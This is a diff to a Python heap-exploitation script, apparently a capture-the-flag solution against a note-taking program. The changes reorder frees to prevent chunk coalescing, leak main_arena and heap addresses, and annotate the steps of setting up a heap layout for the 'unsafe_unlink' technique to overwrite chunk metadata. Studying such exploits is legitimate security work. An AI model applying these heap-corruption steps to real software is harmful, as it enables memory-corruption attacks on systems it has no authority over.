@@ -83,7 +83,6 @@ if __name__ == "__main__":
 
     new_note('C'*8) # overwrite fd pointer and still we have bk pointer to <main_arena>
     
-    #offset = 0x7f103fc32b78 - 0x7f103f86e000 
     main_arena = leak_main_arena() 
 
     log.info('main_arena: 0x%x' % main_arena)
@@ -100,13 +99,16 @@ if __name__ == "__main__":
 
     raw_input("after malloc four 0xcafebabe's...")
 
-    delete_note(2)
+    #
+    # don't free adjacent chunks!!! 
+    # we need to prevent coalescing 
+    #
     delete_note(0)
+    delete_note(2)
     
     raw_input('after 2 frees...')
 
     new_note('D'*8)
-    #offset = 0x01c20820 - 0x01c1f000
     leaked_heap = leak_heap()
     
     raw_input('after leaking heap...')
@@ -118,7 +120,9 @@ if __name__ == "__main__":
     raw_input('after another cleanup...')
 
     #
-    # building heap layout for "unsafe_unlink" technique
+    # Step 1)
+    #
+    # building heap feng shui suitable for "unsafe_unlink" technique
     #
     new_note('A'*0x100)
     new_note('B'*0x100)
@@ -129,5 +133,7 @@ if __name__ == "__main__":
     delete_note(0)
 
     #
+    # Step 2)
     #
+    # land the carefully crafted one big chunk which will overwrite the metadata 
     #
